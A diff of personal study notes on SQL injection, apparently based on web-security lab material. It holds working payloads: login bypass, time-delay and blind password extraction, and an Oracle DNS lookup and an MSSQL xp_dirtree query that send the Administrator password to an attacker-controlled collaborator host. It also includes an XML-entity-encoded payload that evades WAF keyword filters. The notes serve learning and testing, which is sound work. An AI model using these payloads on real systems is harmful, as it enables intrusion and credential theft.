@@ -153,10 +153,10 @@ parameterized query:
         one can't do  
         > ORDER BY ?  
     
-    ### if pentester see `GET /products?sort=price`, ORDER BY is injectable unless proved otherwise.
+    #### if pentester see `GET /products?sort=price`, ORDER BY is injectable unless proved otherwise.
 
 
-## Retive hidden data:
+### Retive hidden data:
 
 The URL for listing specific products is:  
 > https://insecure-website.com/products?category=Gifts  
@@ -181,7 +181,7 @@ final SQL query:
 SQL query in request:
 > SELECT * FROM products WHERE category = 'Gifts' OR 1+1 *--'release = 1*
 
-## Subverting Application Logic - login bypass:
+### Subverting Application Logic - login bypass:
 
 An application has a login page.  
 It uses following SQL query to login:  
@@ -196,7 +196,7 @@ final query becomes:
 password is bypassed.  
 attacker have access to user john@a.com account.
 
-## SQLi UNION attacks:
+### SQLi UNION attacks:
 
 It is used for retrievel of information and not login bypass.  
 
@@ -717,14 +717,14 @@ here comes Time Delay attack - **exploit the SQLi vulnerabilty by triggering tim
 - monitor abnormal response delays.
 
 
-### In Microsoft SQL test if time delay works:
+#### In Microsoft SQL test if time delay works:
 > '; IF (1=2) WAITFOR DELAY '0:0:10'--  
 '; IF (1=1) WAITFOR DELAY '0:0:10'--
 
-### Retrieve data by testing one character at a time:
+#### Retrieve data by testing one character at a time:
 >'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
-### Example - delay based SQLi (postgres SQL):
+#### Example - delay based SQLi (postgres SQL):
 
 Check if response is delayed or not:
 > TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
@@ -933,3 +933,89 @@ Techniques for triggering a DNS query are specific to the type of DB being used.
 
 This causes the database to perform a lookup for the following domain: 
 > 0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+
+This domain is attackers external controlled system/server.  
+Send a payload from the vulnerable app and that payload will interact with the attackers server.
+
+Example - **DNS lookup**:  
+
+orcale database:
+> Cookie: TrackingId=e684hH7Y140MWhTM`'||+(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual)--`; session=f6v...
+
+This will trigger out of band interaction in oracle DB.
+
+Refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for more queries.
+
+#### Exfiltrate data:
+
+> '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+The Input:  
+- reads the password for the `Administrator` user,  
+- appends a unique collaborator subdomain
+- trigger a DNS lookup - this lookup will show the password.
+    > S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+
+``` 
+OAST -
+    high chance of success.
+    ability to exfilrate data within out-of-band channel
+```
+
+### SQLi in different contexts:
+
+previously - all SQL payload was injected to `query string`.  
+
+But can also be injected in other `controllable input`. they just need to be proccessed as SQL query by the app.  
+
+eg- input in JSON / XML - SQL query is build using JSON/XML
+
+this acutally helps in **bypassing defenes**.  
+Weak implementations often look for **common SQL injection keywords** within the request.
+
+#### controllable input:
+1. JSON bodies(API)
+2. XML data
+3. Cookies
+4. HTTP headers
+5. form fields
+6. tracking IDs
+
+    #### JSON example:
+    ```
+    {
+        "productId": "123",
+        "storeId": "999"
+    }
+    ```
+    #### XML example:
+    ```
+    <stockCheck>
+        <productId>123</productId>
+        <storeId>999</storeId>
+    </stockCheck>
+    ```
+
+    #### in the back end:
+    >SELECT * FROM stock WHERE product_id = '123' AND store_id = '999'
+
+    - Builds dynamically -> SQli  
+    - WAF fails too.
+        - looks for common keywords (`SELECT`, `UNION`, `OR`)
+        - only scan `query string`
+        - they dont often decode input from:
+            - XML
+            - JSON
+            - Unicode encoding
+
+        example (**obfuscated** payload):
+        ```
+        <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+        ```
+        `&#x53;` -> XML escape -> hex`53` = ASCII `S`  
+        WAF sees - `&#x53;ELECT` - **miss the keyword**   
+        but DB sees - `SELECT`
+
+        #### defence - security check of `WAF` should happen after decoding of the formate 
+
+
